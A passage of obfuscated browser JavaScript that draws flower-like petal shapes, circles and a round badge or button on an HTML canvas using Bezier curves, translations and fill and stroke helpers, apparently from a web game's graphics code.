			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ⲆᐃᐃᐃΔ], 2 * ᐃ);
			ⵠᐃᐃ(Δ, 266 * ᐃ, ᐃ * 251.546875, ᐃ * 19.1049731745428);
			ΔⲆ(Δ, Ⲇᐃ[8], Ⲇᐃ[9], Ⲇⵠⵠᐃ * ᐃ);
			ⵠᐃᐃ(Δ, 292 * ᐃ, ᐃ * 274.546875, ᐃ * 15.556349186104045);
			ΔⲆ(Δ, Ⲇᐃ[8], Ⲇᐃ[9], ᐃ * 2);
			ⵠᐃᐃ(Δ, ᐃ * 258, ᐃ * 291.546875, ᐃ * 17.029386365926403);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠᐃᐃⵠ], Ⲇᐃ[ᐃⵠᐃᐃⲆ], ᐃ * ⵠⵠΔⲆ);
			Δ.scale(1.4, 1.4);
			Δ.translate(-700 * ᐃ, 280 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(273 * ᐃ, ᐃ * 46.546875);
			Δ.bezierCurveTo(353 * ᐃ, ᐃ * 131.546875, ᐃ * 303, 213.546875 * ᐃ, ᐃ * 272, ᐃ * 236.546875);
			Δ.bezierCurveTo(203 * ᐃ, 179.546875 * ᐃ, 236 * ᐃ, ᐃ * 84.546875, 273 * ᐃ, ᐃ * 47.546875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠΔ], Ⲇᐃ[ᐃΔΔΔ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 467, 257.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 369, 194.546875 * ᐃ, 325 * ᐃ, 236.546875 * ᐃ, ᐃ * 291, ᐃ * 271.546875);
			Δ.bezierCurveTo(371 * ᐃ, 335.546875 * ᐃ, 427 * ᐃ, 313.546875 * ᐃ, ᐃ * 467, ᐃ * 258.546875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 269, 275.546875 * ᐃ);
			Δ.bezierCurveTo(343 * ᐃ, 356.546875 * ᐃ, 355 * ᐃ, 407.546875 * ᐃ, ᐃ * 323, ᐃ * 472.546875);
			Δ.bezierCurveTo(224 * ᐃ, 451.546875 * ᐃ, ᐃ * 238, 326.546875 * ᐃ, ᐃ * 270, 275.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃΔ], Ⲇᐃ[5], ⵠⵠⵠΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 260, ᐃ * 267.546875);
			Δ.bezierCurveTo(ᐃ * 134, ᐃ * 221.546875, 89 * ᐃ, ᐃ * 256.546875, 60 * ᐃ, ᐃ * 295.546875);
			Δ.bezierCurveTo(ᐃ * 116, ᐃ * 357.546875, 242 * ᐃ, 344.546875 * ᐃ, ᐃ * 260, 267.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 124, ᐃ * 123.546875);
			Δ.bezierCurveTo(ᐃ * ᐃᐃⲆⵠⲆ, ᐃ * 140.546875, 265 * ᐃ, 234.546875 * ᐃ, ᐃ * 267, ᐃ * 269.546875);
			Δ.bezierCurveTo(159 * ᐃ, 283.546875 * ᐃ, 127 * ᐃ, 192.546875 * ᐃ, ᐃ * 124, ᐃ * 124.546875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ᐃⵠᐃⵠⵠΔᐃ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(267 * ᐃ, 268.546875 * ᐃ);
			Δ.bezierCurveTo(265 * ᐃ, 170.546875 * ᐃ, ᐃ * 364, 127.546875 * ᐃ, 407 * ᐃ, ᐃ * 132.546875);
			Δ.bezierCurveTo(427 * ᐃ, ᐃ * 204.546875, ᐃ * 341, ᐃ * 277.546875, 268 * ᐃ, 271.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[7], ᐃ * ᐃⲆΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(270 * ᐃ, ᐃ * 269.546875);
			Δ.bezierCurveTo(ᐃ * 370, ᐃ * 251.546875, 410 * ᐃ, 328.546875 * ᐃ, ᐃ * 420, 399.546875 * ᐃ);
			Δ.bezierCurveTo(292 * ᐃ, ᐃ * 412.546875, 275 * ᐃ, ᐃ * 313.546875, ᐃ * 269, 272.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ΔⲆΔᐃᐃ], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(273 * ᐃ, ᐃ * 266.546875);
			Δ.bezierCurveTo(ᐃ * 291, ᐃ * 370.546875, 235 * ᐃ, 428.546875 * ᐃ, 173 * ᐃ, 451.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 124, ᐃ * 365.546875, 217 * ᐃ, 274.546875 * ᐃ, 272 * ᐃ, 265.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⲆⲆ], Ⲇᐃ[7], ᐃ * ⵠⲆⵠⲆ);
			ⵠᐃᐃ(Δ, 266 * ᐃ, 251.546875 * ᐃ, ᐃ * 19.1049731745428);
			ΔⲆ(Δ, Ⲇᐃ[8], Ⲇᐃ[9], ᐃ * 2);
			ⵠᐃᐃ(Δ, 292 * ᐃ, 274.546875 * ᐃ, ᐃ * 15.556349186104045);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔᐃ], Ⲇᐃ[ᐃΔᐃᐃΔⲆⵠ], ᐃ * 2);
			ⵠᐃᐃ(Δ, ᐃ * 258, 291.546875 * ᐃ, ᐃ * 17.029386365926403);
			ΔⲆ(Δ, Ⲇᐃ[8], Ⲇᐃ[ΔΔⵠⲆⵠ], 2 * ᐃ);
			Δ.translate(-900 * ᐃ, ᐃ * -200);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 273, 46.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 353, ᐃ * 131.546875, 303 * ᐃ, 213.546875 * ᐃ, 272 * ᐃ, 236.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 203, 179.546875 * ᐃ, ᐃ * 236, ᐃ * 84.546875, ᐃ * 273, ᐃ * 47.546875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠᐃΔ], Ⲇᐃ[5], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 467, 257.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 369, ᐃ * 194.546875, ᐃ * 325, ᐃ * 236.546875, 291 * ᐃ, 271.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 371, 335.546875 * ᐃ, ᐃ * 427, ᐃ * 313.546875, ᐃ * 467, 258.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃⲆⵠ], Ⲇᐃ[ⵠᐃΔⵠ], ᐃⲆΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(269 * ᐃ, ᐃ * 275.546875);
			Δ.bezierCurveTo(ᐃ * 343, 356.546875 * ᐃ, ᐃ * 355, 407.546875 * ᐃ, ᐃ * 323, ᐃ * 472.546875);
			Δ.bezierCurveTo(ᐃ * 224, 451.546875 * ᐃ, 238 * ᐃ, ᐃ * 326.546875, 270 * ᐃ, ᐃ * 275.546875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(260 * ᐃ, ᐃ * 267.546875);
			Δ.bezierCurveTo(134 * ᐃ, 221.546875 * ᐃ, ᐃ * 89, ᐃ * 256.546875, 60 * ᐃ, ᐃ * 295.546875);
			Δ.bezierCurveTo(116 * ᐃ, 357.546875 * ᐃ, ᐃ * 242, ᐃ * 344.546875, ᐃ * 260, ᐃ * 267.546875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ΔᐃΔⲆ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(124 * ᐃ, 123.546875 * ᐃ);
			Δ.bezierCurveTo(ⵠⲆⵠⵠᐃⲆⵠ * ᐃ, 140.546875 * ᐃ, 265 * ᐃ, 234.546875 * ᐃ, 267 * ᐃ, ᐃ * 269.546875);
			Δ.bezierCurveTo(159 * ᐃ, ᐃ * 283.546875, ᐃ * 127, ᐃ * 192.546875, ᐃ * 124, 124.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⲆⲆ], Ⲇᐃ[ⲆⲆⵠⲆⵠ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(267 * ᐃ, 268.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 265, 170.546875 * ᐃ, 364 * ᐃ, ᐃ * 127.546875, ᐃ * 407, ᐃ * 132.546875);
			Δ.bezierCurveTo(427 * ᐃ, 204.546875 * ᐃ, ᐃ * 341, ᐃ * 277.546875, 268 * ᐃ, 271.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ⲆⲆⲆᐃΔ], ᐃ * ⵠⲆⵠⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 270, ᐃ * 269.546875);
			Δ.bezierCurveTo(370 * ᐃ, ᐃ * 251.546875, ᐃ * 410, ᐃ * 328.546875, 420 * ᐃ, 399.546875 * ᐃ);
			Δ.bezierCurveTo(292 * ᐃ, ᐃ * 412.546875, ᐃ * 275, ᐃ * 313.546875, ᐃ * 269, ᐃ * 272.546875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠⲆⲆ], Ⲇᐃ[ᐃⲆΔΔΔᐃᐃ], Ⲇᐃᐃⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 273, 266.546875 * ᐃ);
			Δ.bezierCurveTo(291 * ᐃ, 370.546875 * ᐃ, ᐃ * 235, ᐃ * 428.546875, 173 * ᐃ, ᐃ * 451.546875);
			Δ.bezierCurveTo(124 * ᐃ, ᐃ * 365.546875, ᐃ * 217, 274.546875 * ᐃ, 272 * ᐃ, ᐃ * 265.546875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⵠⲆ], Ⲇᐃ[ⵠΔⵠΔⵠΔⵠ], ᐃ * ΔⵠᐃⲆ);
			ⵠᐃᐃ(Δ, 266 * ᐃ, 251.546875 * ᐃ, ᐃ * 19.1049731745428);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆΔΔ], Ⲇᐃ[9], ΔⲆΔΔΔ * ᐃ);
			ⵠᐃᐃ(Δ, 292 * ᐃ, 274.546875 * ᐃ, 15.556349186104045 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃΔⲆⵠ], Ⲇᐃ[9], ᐃ * ᐃⵠⲆⲆⲆ);
			ⵠᐃᐃ(Δ, ᐃ * 258, 291.546875 * ᐃ, ᐃ * 17.029386365926403);
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔⲆⲆ], Ⲇᐃ[ⵠΔᐃⲆᐃᐃⲆ], ⲆᐃᐃⲆ * ᐃ);
			return Ⲇⵠ
		}

		function ⲆⵠⲆΔⵠΔⲆᐃⵠ(ᐃⵠᐃΔ) {
			var Ⲇⵠⵠ = [];
			for (var ⵠᐃ = 0; ⵠᐃ < ᐃⵠᐃΔ.length; ⵠᐃ++) Ⲇⵠⵠ.push(ⵠᐃΔⲆᐃΔΔᐃⲆ(ᐃⵠᐃΔ[ⵠᐃ], 2 == ⵠᐃ ? ⲆⵠⵠᐃⲆ : false));
			return Ⲇⵠⵠ
		}

		function ᐃⵠᐃⲆΔⵠⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 496;
			Ⲇⵠ.height = 520 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(0, ᐃ * ⲆⵠⲆᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(19.000030517578125 * ᐃ, ᐃ * 256.67613983154297);
			Δ.bezierCurveTo(ᐃ * 1.000030517578125, ᐃ * 332.67613983154297, 23.000030517578125 * ᐃ, ᐃ * 404.67613983154297, 95.00003051757812 * ᐃ, ᐃ * 463.67613983154297);
			Δ.bezierCurveTo(ᐃ * 128.00003051757812, ᐃ * 491.67613983154297, ᐃ * 165.00003051757812, 507.67613983154297 * ᐃ, ᐃ * 194.00003051757812, ᐃ * 512.676139831543);
			Δ.bezierCurveTo(ᐃ * 280.0000305175781, ᐃ * 517.676139831543, 291.0000305175781 * ᐃ, 516.676139831543 * ᐃ, ᐃ * 342.0000305175781, 497.67613983154297 * ᐃ);
			Δ.bezierCurveTo(425.0000305175781 * ᐃ, 454.67613983154297 * ᐃ, ᐃ * 469.0000305175781, 392.67613983154297 * ᐃ, ᐃ * 468.0000305175781, 300.67613983154297 * ᐃ);
			Δ.bezierCurveTo(408.5000305175781 * ᐃ, ᐃ * 365.17613983154297, 408.5000305175781 * ᐃ, ᐃ * 365.17613983154297, 349.0000305175781 * ᐃ, ᐃ * 429.67613983154297);
			Δ.bezierCurveTo(ᐃ * 256.0000305175781, ᐃ * 473.67613983154297, 167.00003051757812 * ᐃ, 459.67613983154297 * ᐃ, 78.00003051757812 * ᐃ, 384.67613983154297 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
			Δ.globalAlpha = 1;
			Δ.translate(0, -10 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 247.01138305664062, 249.3125 * ᐃ, ᐃ * 161.4465855941215);
			ΔⲆ(Δ, Ⲇᐃ[5], ⵠΔᐃⲆΔ, ⲆΔⵠᐃⲆ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⲆⵠⲆⲆ;
			Δ.translate(0, ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 65.00003051757812, ᐃ * 263.4034118652344);
			Δ.bezierCurveTo(ᐃ * 109.00003051757812, ᐃ * 160.40341186523438, 185.00003051757812 * ᐃ, ᐃ * 128.40341186523438, ᐃ * 222.00003051757812, ᐃ * 124.40341186523438);
			Δ.bezierCurveTo(277.0000305175781 * ᐃ, 116.40341186523438 * ᐃ, ᐃ * 339.0000305175781, ᐃ * 134.40341186523438, 379.0000305175781 * ᐃ, 195.40341186523438 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 409.0000305175781, 242.40341186523438 * ᐃ, 416.0000305175781 * ᐃ, 256.4034118652344 * ᐃ, ᐃ * 428.0000305175781, 304.4034118652344 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 457.0000305175781, ᐃ * 203.40341186523438, ᐃ * 449.0000305175781, 183.40341186523438 * ᐃ, ᐃ * 438.0000305175781, ᐃ * 162.40341186523438);
			Δ.bezierCurveTo(ᐃ * 381.0000305175781, 73.40341186523438 * ᐃ, 360.0000305175781 * ᐃ, 66.40341186523438 * ᐃ, 257.0000305175781 * ᐃ, 46.403411865234375 * ᐃ);
			Δ.bezierCurveTo(191.00003051757812 * ᐃ, 45.403411865234375 * ᐃ, 142.00003051757812 * ᐃ, ᐃ * 65.40341186523438, 101.00003051757812 * ᐃ, ᐃ * 115.40341186523438);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ⵠΔⲆ;
			var ᐃⵠ = ΔⲆΔⵠⵠΔⵠⵠΔ(ᐃ, Ⲇᐃ);
			Δ.drawImage(ᐃⵠ, ᐃⵠⲆⵠ, ᐃⵠΔ);
			Δ.translate(ᐃⵠΔ, ᐃ * -ⲆⲆⲆΔᐃ);
			ⵠᐃᐃ(Δ, 247.01138305664062 * ᐃ, 249.3125 * ᐃ, 161.4465855941215 * ᐃ);
			ΔⲆ(Δ, ⲆΔΔΔⲆ, Ⲇᐃ[ΔⲆΔΔΔ], 12 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔⵠⲆΔ;
			Δ.translate(ΔΔⵠ, 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(325.0113830566406 * ᐃ, 13.767059326171875 * ᐃ);
			Δ.bezierCurveTo(349.5113830566406 * ᐃ, 25.767059326171875 * ᐃ, 349.5113830566406 * ᐃ, ᐃ * 25.767059326171875, ᐃ * 374.0113830566406, ᐃ * 37.767059326171875);
			Δ.bezierCurveTo(ᐃ * 384.0113830566406, ᐃ * 44.767059326171875, 383.0113830566406 * ᐃ, ᐃ * 50.767059326171875, 368.0113830566406 * ᐃ, ᐃ * 68.76705932617188);
			Δ.bezierCurveTo(352.5113830566406 * ᐃ, ᐃ * 91.26705932617188, ᐃ * 352.5113830566406, ᐃ * 91.26705932617188, 337.0113830566406 * ᐃ, 113.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 328.0113830566406, ᐃ * 119.76705932617188, 328.0113830566406 * ᐃ, ᐃ * 121.76705932617188, 312.0113830566406 * ᐃ, ᐃ * 112.76705932617188);
			Δ.bezierCurveTo(ᐃ * 303.0113830566406, ᐃ * 108.26705932617188, 303.0113830566406 * ᐃ, 108.26705932617188 * ᐃ, 294.0113830566406 * ᐃ, ᐃ * 103.76705932617188);
			Δ.bezierCurveTo(287.0113830566406 * ᐃ, ᐃ * 99.76705932617188, 293.0113830566406 * ᐃ, 84.76705932617188 * ᐃ, 297.0113830566406 * ᐃ, ᐃ * 67.76705932617188);
			Δ.bezierCurveTo(ᐃ * 302.0113830566406, 47.767059326171875 * ᐃ, 302.0113830566406 * ᐃ, ᐃ * 47.767059326171875, 307.0113830566406 * ᐃ, ᐃ * 27.767059326171875);
			Δ.bezierCurveTo(ᐃ * 310.0113830566406, ᐃ * 15.767059326171875, ᐃ * 317.0113830566406, ᐃ * 12.767059326171875, ᐃ * 323.0113830566406, ᐃ * 13.767059326171875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ᐃⵠΔ], ᐃ * ᐃᐃΔᐃⲆ);
			Δ.globalAlpha = 1;
			Δ.translate(ⲆΔⵠ, -ⵠⵠᐃⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(325.0113830566406 * ᐃ, 13.767059326171875 * ᐃ);
			Δ.bezierCurveTo(349.5113830566406 * ᐃ, ᐃ * 25.767059326171875, ᐃ * 349.5113830566406, ᐃ * 25.767059326171875, 374.0113830566406 * ᐃ, ᐃ * 37.767059326171875);
			Δ.bezierCurveTo(ᐃ * 384.0113830566406, 44.767059326171875 * ᐃ, ᐃ * 383.0113830566406, ᐃ * 50.767059326171875, 368.0113830566406 * ᐃ, ᐃ * 68.76705932617188);
			Δ.bezierCurveTo(ᐃ * 352.5113830566406, 91.26705932617188 * ᐃ, ᐃ * 352.5113830566406, ᐃ * 91.26705932617188, ᐃ * 337.0113830566406, ᐃ * 113.76705932617188);
			Δ.bezierCurveTo(328.0113830566406 * ᐃ, 119.76705932617188 * ᐃ, ᐃ * 328.0113830566406, ᐃ * 121.76705932617188, 312.0113830566406 * ᐃ, ᐃ * 112.76705932617188);
			Δ.bezierCurveTo(303.0113830566406 * ᐃ, 108.26705932617188 * ᐃ, ᐃ * 303.0113830566406, ᐃ * 108.26705932617188, ᐃ * 294.0113830566406, 103.76705932617188 * ᐃ);
			Δ.bezierCurveTo(287.0113830566406 * ᐃ, 99.76705932617188 * ᐃ, 293.0113830566406 * ᐃ, ᐃ * 84.76705932617188, ᐃ * 297.0113830566406, 67.76705932617188 * ᐃ);
			Δ.bezierCurveTo(302.0113830566406 * ᐃ, ᐃ * 47.767059326171875, ᐃ * 302.0113830566406, 47.767059326171875 * ᐃ, ᐃ * 307.0113830566406, ᐃ * 27.767059326171875);
			Δ.bezierCurveTo(ᐃ * 310.0113830566406, ᐃ * 15.767059326171875, ᐃ * 317.0113830566406, ᐃ * 12.767059326171875, 323.0113830566406 * ᐃ, ᐃ * 13.767059326171875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ], Ⲇᐃ[Δⵠⵠⵠ], ΔΔΔᐃᐃⲆᐃ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ΔΔⵠⵠ, ᐃ * ⲆΔⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(403.0113830566406 * ᐃ, ᐃ * 89.76705932617188);
			Δ.bezierCurveTo(ᐃ * 413.0113830566406, 76.76705932617188 * ᐃ, ᐃ * 418.0113830566406, 79.76705932617188 * ᐃ, 428.0113830566406 * ᐃ, 92.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 435.0113830566406, 99.76705932617188 * ᐃ, 435.0113830566406 * ᐃ, ᐃ * 99.76705932617188, 442.0113830566406 * ᐃ, 106.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 450.0113830566406, 116.76705932617188 * ᐃ, 445.0113830566406 * ᐃ, ᐃ * 119.76705932617188, 433.0113830566406 * ᐃ, ᐃ * 128.76705932617188);
			Δ.bezierCurveTo(ᐃ * 408.0113830566406, ᐃ * 146.26705932617188, ᐃ * 408.0113830566406, 146.26705932617188 * ᐃ, 383.0113830566406 * ᐃ, ᐃ * 163.76705932617188);
			Δ.bezierCurveTo(ᐃ * 376.0113830566406, 166.76705932617188 * ᐃ, 377.0113830566406 * ᐃ, ᐃ * 165.76705932617188, 368.0113830566406 * ᐃ, 156.76705932617188 * ᐃ);
			Δ.bezierCurveTo(359.0113830566406 * ᐃ, 144.76705932617188 * ᐃ, ᐃ * 359.0113830566406, ᐃ * 142.76705932617188, ᐃ * 367.0113830566406, 133.76705932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ], Ⲇᐃ[ⵠᐃⲆᐃ], ᐃᐃⵠᐃΔᐃⵠ * ᐃ);
			Δ.globalAlpha = ΔⲆⵠ;
			Δ.translate(ΔΔⵠ, -5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(ᐃ * 403.0113830566406, 89.76705932617188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 413.0113830566406, ᐃ * 76.76705932617188, ᐃ * 418.0113830566406, 79.76705932617188 * ᐃ, 428.0113830566406 * ᐃ, ᐃ * 92.76705932617188);
			Δ.bezierCurveTo(ᐃ * 435.0113830566406, ᐃ * 99.76705932617188, ᐃ * 435.0113830566406, 99.76705932617188 * ᐃ, 442.0113830566406 * ᐃ, 106.76705932617188 * ᐃ);
			Δ.bezierCurveTo(450.0113830566406 * ᐃ, ᐃ * 116.76705932617188, 445.0113830566406 * ᐃ, ᐃ * 119.76705932617188, ᐃ * 433.0113830566406, 128.76705932617188 * ᐃ);
			Δ.bezierCurveTo(408.0113830566406 * ᐃ, 146.26705932617188 * ᐃ, ᐃ * 408.0113830566406, 146.26705932617188 * ᐃ, 383.0113830566406 * ᐃ, 163.76705932617188 * ᐃ);
			Δ.bezierCurveTo(376.0113830566406 * ᐃ, ᐃ * 166.76705932617188, 377.0113830566406 * ᐃ, 165.76705932617188 * ᐃ, ᐃ * 368.0113830566406, ᐃ * 156.76705932617188);
			Δ.bezierCurveTo(359.0113830566406 * ᐃ, 144.76705932617188 * ᐃ, 359.0113830566406 * ᐃ, ᐃ * 142.76705932617188, ᐃ * 367.0113830566406, 133.76705932617188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⲆⲆΔᐃ], ᐃ * ⲆΔⲆΔⲆ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(0, ᐃ * ΔᐃΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 228.01138305664062, ᐃ * 1.767059326171875);
			Δ.bezierCurveTo(ᐃ * 246.51138305664062, 3.267059326171875 * ᐃ, ᐃ * 246.51138305664062, 3.267059326171875 * ᐃ, 265.0113830566406 * ᐃ, ᐃ * 4.767059326171875);
			Δ.bezierCurveTo(ᐃ * 273.0113830566406, ᐃ * 5.767059326171875, ᐃ * 275.0113830566406, ᐃ * 11.767059326171875, 270.0113830566406 * ᐃ, 27.767059326171875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 264.0113830566406, ᐃ * 54.267059326171875, 264.0113830566406 * ᐃ, 54.267059326171875 * ᐃ, ᐃ * 258.0113830566406, ᐃ * 80.76705932617188);
			Δ.bezierCurveTo(ᐃ * 256.0113830566406, 92.76705932617188 * ᐃ, ᐃ * 256.0113830566406, 94.76705932617188 * ᐃ, 242.01138305664062 * ᐃ, 93.76705932617188 * ᐃ);
			Δ.bezierCurveTo(226.01138305664062 * ᐃ, 95.76705932617188 * ᐃ, 225.01138305664062 * ᐃ, 91.76705932617188 * ᐃ, ᐃ * 225.01138305664062, ᐃ * 80.76705932617188);
			Δ.bezierCurveTo(ᐃ * 223.51138305664062, ᐃ * 50.267059326171875, 223.51138305664062 * ᐃ, 50.267059326171875 * ᐃ, ᐃ * 222.01138305664062, ᐃ * 19.767059326171875);
			Δ.bezierCurveTo(ᐃ * 219.01138305664062, 8.767059326171875 * ᐃ, 224.01138305664062 * ᐃ, 4.767059326171875 * ᐃ, 227.01138305664062 * ᐃ, ᐃ * 2.767059326171875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ], Ⲇᐃ[0], ⵠⲆΔΔᐃ * ᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(ΔᐃΔΔ, ᐃ * -ⵠⵠᐃⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 228.01138305664062, ᐃ * 1.767059326171875);
			Δ.bezierCurveTo(ᐃ * 246.51138305664062, 3.267059326171875 * ᐃ, ᐃ * 246.51138305664062, ᐃ * 3.267059326171875, 265.0113830566406 * ᐃ, 4.767059326171875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 273.0113830566406, ᐃ * 5.767059326171875, ᐃ * 275.0113830566406, 11.767059326171875 * ᐃ, ᐃ * 270.0113830566406, ᐃ * 27.767059326171875);
			Δ.bezierCurveTo(264.0113830566406 * ᐃ, ᐃ * 54.267059326171875, 264.0113830566406 * ᐃ, ᐃ * 54.267059326171875, ᐃ * 258.0113830566406, ᐃ * 80.76705932617188);
			Δ.bezierCurveTo(256.0113830566406 * ᐃ, 92.76705932617188 * ᐃ, ᐃ * 256.0113830566406, 94.76705932617188 * ᐃ, 242.01138305664062 * ᐃ, ᐃ * 93.76705932617188);
			Δ.bezierCurveTo(226.01138305664062 * ᐃ, ᐃ * 95.76705932617188, ᐃ * 225.01138305664062, ᐃ * 91.76705932617188, 225.01138305664062 * ᐃ, 80.76705932617188 * ᐃ);
